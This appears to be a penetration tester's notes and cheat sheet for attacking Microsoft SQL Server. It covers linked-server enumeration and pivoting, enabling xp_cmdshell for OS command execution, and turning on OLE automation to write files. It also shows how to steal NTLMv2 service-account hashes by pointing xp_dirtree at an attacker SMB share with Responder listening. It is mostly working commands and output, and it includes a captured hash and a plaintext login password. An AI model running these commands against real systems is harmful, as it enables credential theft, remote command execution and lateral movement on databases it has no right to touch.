vectors: xpcmd, linked server pivot, hash steal, sql user impersonation

### Linked Server Enumeration

```sql

-- List linked servers

SELECT srvname, isremote FROM sysservers;

GO

```

- `isremote = 1` remote server

- `isremote = 0` trusted linked server

### Check Users & Privileges

```sql
-- Current user

SELECT user_name();

-- List status and admins
SELECT name, sysadmin FROM syslogins;

```

### Run Queries on Linked Servers

```sql

-- Run query on linked server

EXEC ('SELECT current_user') AT [<DOMAIN>\<CONFIG_FILE>];

EXEC ('SELECT srvname,isremote FROM sysservers') AT [<DOMAIN>\<CONFIG_FILE>];

EXEC ('EXEC (''SELECT suser_name()'')') AT [<DOMAIN>\<CONFIG_FILE>];

```

---

### 1. Test `xp_cmdshell`

```sql

EXEC sp_configure 'show advanced options', 1;

RECONFIGURE;

EXEC sp_configure; -- check if xp_cmdshell is enabled

EXEC sp_configure 'xp_cmdshell', 1;

RECONFIGURE;

EXEC xp_cmdshell "whoami";

```

### 2. Enable `xp_cmdshell` (if permitted)

```sql

EXEC sp_configure 'show advanced options', 1;

RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;

RECONFIGURE;

```

---

## Privilege Escalation

- `xp_regwrite` can use User Defined Functions (UDFs) for execution (rare in prod).

- Example: [`lib_mysqludf_sys`](https://github.com/mysqludf/lib_mysqludf_sys).

---

## Linked Servers (Pivoting)

- Linked servers let SQL execute queries on remote DBs.

- Example:

```sql

EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin''))') AT [10.0.0.12\SQLEXPRESS];

```

---

## Hash Theft (Relay MSSQL)

- Use **undocumented procs**: `xp_dirtree`, `xp_subdirs`.
- These trigger **SMB auth** then use procedures to create/write files.

---

# Cheat Sheet

- **Enum linked servers:** `SELECT srvname,isremote FROM sysservers;`

- **Check users:** `SELECT user_name();` / `SELECT name, sysadmin FROM syslogins;`

- **Linked server exec:** `EXEC('SELECT suser_name()') AT [server];`

- **Test cmd exec:** `xp_cmdshell "whoami";`

- **Enable xp_cmdshell:** `sp_configure 'xp_cmdshell',1; RECONFIGURE;`

- **Steal hash:** `EXEC master..xp_dirtree '\attacker\share\';`

- **Responder listener:** `sudo responder -I tun0`

- **Enable file write:** `sp_configure 'Ole Automation Procedures',1; RECONFIGURE;`

---

## MOVED/DUP

network services mssql part maybe move it here?

#### linked server enum

```
 SELECT srvname, isremote FROM sysservers
2> GO
```

look for db admin users

```
SQL> SELECT user_name();
SQL> SELECT name,sysadmin FROM syslogins;
```

```
SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
```

## command execution

#### 1. test if xp_cmdshell is enabled

```
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> reconfigure
SQL> xp_cmdshell "whoami"
```

#### 2. enable xp_cmdshell

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

```mssql
-- To allow advanced options to be changed.
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.
RECONFIGURE
GO

-- To enable the feature.
EXECUTE sp_configure 'xp_cmdshell', 1
GO

-- To update the currently configured value for this feature.
RECONFIGURE
GO
```

---

## Privilege Escalation

there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.

`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.

## Communicate with Other Databases with MSSQL

`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

#### Identify linked Servers in MSSQL

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.

Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

---

## RELAY SQLSERVER TO STEAL HASH

we can steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.

When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

To make this work, we need first to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries:

use

```
sudo smbserver.py -smb2support share $(pwd)
```

```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

![](/images/Pasted image 20250701204753.png)
If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.

```
┌──(demise㉿kali)-[~/Desktop]
└─$ impacket-mssqlclient mssqlsvc:princess1@10.129.128.62 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (WIN-02\mssqlsvc  guest@master)>
```

### responder method

switch to root

```
su root
```

```
$ source /home/demise/venv/bin/activate
```

`cd  /home/demise/tools/Responder`

`$ python3 Responder.py    `

```shell-session
$ sudo responder -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
```

```shell-session
$ sudo impacket-smbserver share ./ -smb2support
```

---

## writing files

To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

#### MSSQL - Enable Ole Automation Procedures

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
